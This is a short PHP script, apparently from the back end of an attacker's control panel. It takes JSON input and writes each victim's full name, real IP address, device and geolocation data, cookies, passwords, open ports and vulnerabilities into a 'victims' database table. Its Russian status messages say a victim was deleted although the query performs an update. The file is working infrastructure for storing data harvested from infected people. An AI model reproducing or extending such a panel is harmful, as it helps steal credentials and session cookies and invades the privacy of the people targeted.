<?php
include 'v2/admin/functions/db_connect.php';

$jsonData = file_get_contents('php://input');
$data = json_decode($jsonData, true);

$id = $data['id'];
$fullName = $data['fullName'];
$realIP = $data['realIP'];
$deviceInfo = $data['deviceInfo'];
$geoInfo = $data['geoInfo'];
$cookies = $data['cookies'];
$passwords = $data['passwords'];
$openPorts = $data['openPorts'];
$vulnerabilities = $data['vulnerabilities'];

$sql = "UPDATE victims SET fullName = ?, realIP = ?, deviceInfo = ?, geoInfo = ?, cookies = ?, passwords = ?, openPorts = ?, vulnerabilities = ? WHERE id = ?";
$stmt = $conn->prepare($sql);
$stmt->bind_param("ssssssssi", $fullName, $realIP, $deviceInfo, $geoInfo, $cookies, $passwords, $openPorts, $vulnerabilities, $id);

if ($stmt->execute()) {
    echo "Жертва удалена";
} else {
    echo "Ошибка при удаление жертвы: " . $stmt->error;
}

$stmt->close();
$conn->close();
?>